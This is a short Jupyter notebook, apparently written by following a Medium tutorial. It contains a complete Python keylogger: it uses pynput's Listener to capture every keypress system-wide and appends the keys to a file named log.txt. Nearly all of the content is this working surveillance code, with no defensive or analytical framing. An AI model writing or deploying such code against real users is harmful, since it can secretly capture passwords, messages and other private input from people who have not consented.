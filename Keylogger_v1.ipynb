{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# pip install pynput\n",
    "# installing library\n",
    "\n",
    "# articles used:\n",
    "# 1) https://medium.com/analytics-vidhya/python-keylogger-tutorial-ef178d02f24a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Listener"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "def log_keystroke(key):\n",
    "    key = str(key).replace(\"'\",\"\")\n",
    "    \n",
    "    if key == 'Key.space':\n",
    "        key = ' '\n",
    "    if key == 'Key.shift_r':\n",
    "        key = ''\n",
    "    if key == 'Key.enter':\n",
    "        key = '\\n'\n",
    "        \n",
    "    with open(\"log.txt\", 'a') as f:\n",
    "        f.write(key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with Listener(on_press=log_keystroke) as l:\n",
    "    l.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
